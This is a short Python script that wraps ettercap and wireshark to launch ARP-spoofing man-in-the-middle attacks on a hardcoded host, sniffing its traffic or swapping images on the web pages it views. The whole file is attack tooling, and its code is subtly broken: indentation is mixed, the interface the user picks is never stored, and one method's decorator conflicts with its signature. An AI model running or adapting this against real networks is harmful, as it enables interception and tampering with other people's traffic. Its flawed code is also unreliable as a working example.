#!/usr/bin/python
import os
import subprocess

class ArpSpoofing():
	interface = "eth0"
	ipAddress = ""
	def ifaceData(self):
		subprocess.call(["ifconfig"])
                interface = raw_input("Select Interface: ")
		interfaceData = os.popen('ifconfig ' + interface + '| grep "inet\ Ad" | cut -d: -f2 | cut -d" " -f1') 
                ipAddress = interfaceData.read()

	# Starts a normal MITM attack and sniffes the network traffic of the attacked host.
	def ettercapMITM(self):
		self.ifaceData()
		print("Starting wireshark")
		# Start wireshark on selected interface and automatically start sniffing
		wiresharkRunning = subprocess.Popen(["wireshark", "-i", self.interface, "-k"])
		if(wiresharkRunning):
#		print("Waiting for wireshark")
#		time.sleep(5)
			print("Wireshark started")
			raw_input("Press Enter to start MITM")
			# Start ettercap on given interface and ip address and start MITM attack
			subprocess.call(["ettercap", "-T", "-i", self.interface, "-M", "ARP", "/10.0.2.4//", "///", "&"])

	# Replaces all images of websites on the attacked host
	def ettercapFun(self):
		self.ifaceData()
		filter = "/usr/share/ettercap/catFilter.ef"
		subprocess.call(["ettercap", "-T", "-q", "-F", filter, "-i", self.interface, "-M", "ARP", "/10.0.2.4//", "///", "&"])
	
	@staticmethod
	def start(self, index):
		if(index == 1):
			self.ettercapMITM()
		elif(index == 2):
			self.ettercapFun()
